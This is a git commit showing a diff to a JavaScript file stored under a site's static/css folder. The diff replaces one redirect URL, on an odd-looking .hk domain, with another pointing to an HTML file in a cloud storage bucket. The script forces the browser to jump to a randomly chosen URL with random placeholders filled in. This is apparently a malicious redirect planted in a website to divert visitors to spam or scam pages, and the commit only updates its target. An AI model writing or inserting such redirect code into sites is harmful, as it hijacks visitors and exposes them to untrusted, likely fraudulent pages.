21d100e9110ffb0f5d2721387fe3037520e0e9bd
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-27 18:59:10 +0800

    Update mt10.js

--- static/css/mt10.js
+++ static/css/mt10.js
@@ -1,4 +1,4 @@
-var urls=[' http://pbwci.qun.hk./FiuJwj9CI8ks-HPRAdeot2RVSh11#{nnnnnnn}{wwww}',];
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/1d9dbc931ca148c9b8708dc408cf79c2.html#{nnnnnnn}{wwww}',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
